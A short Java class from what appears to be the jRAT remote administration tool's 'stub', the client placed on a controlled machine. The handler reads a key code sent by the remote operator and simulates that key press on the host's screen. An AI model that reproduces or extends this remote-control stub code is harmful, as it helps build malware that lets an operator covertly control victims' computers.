package io.jrat.stub.packets.incoming;

import io.jrat.common.utils.Utils;
import io.jrat.stub.Connection;
import io.jrat.stub.utils.ScreenUtils;

public class Packet94KeyPress extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int btn = con.readInt();

		if (!Utils.isHeadless()) {
			ScreenUtils.getDefault().keyPress(btn);
		}
	}

}
